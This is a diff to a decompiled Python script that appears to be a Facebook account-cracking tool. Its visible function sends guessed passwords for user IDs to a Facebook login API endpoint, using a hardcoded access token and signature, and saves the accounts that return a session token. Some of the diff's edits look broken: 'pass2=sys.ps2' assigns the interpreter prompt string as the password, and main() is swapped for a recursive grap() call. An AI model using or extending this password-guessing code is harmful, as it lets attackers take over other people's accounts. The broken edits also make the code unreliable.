@@ -1,5 +1,6 @@
 # Decompile by Mardis (Tools By Kapten-Kaizo)
 # Time Succes decompile : 2022-03-12 17:47:35.910329
+from imp import reload
 import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
 from xml.dom import NotFoundErr
 from site import main
@@ -2791,7 +2792,7 @@ def p_p_pass():
                     cp.close()
                     cps.append(uid+pass1)
                 else:
-                    pass2=ps2
+                    pass2=sys.ps2
                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                     q = json.loads(data)
                     if "access_token" in q:
@@ -2892,7 +2893,7 @@ def grap():
         else:
             main()
          
-        main()
+        grap()
 
 
 def mineExt():
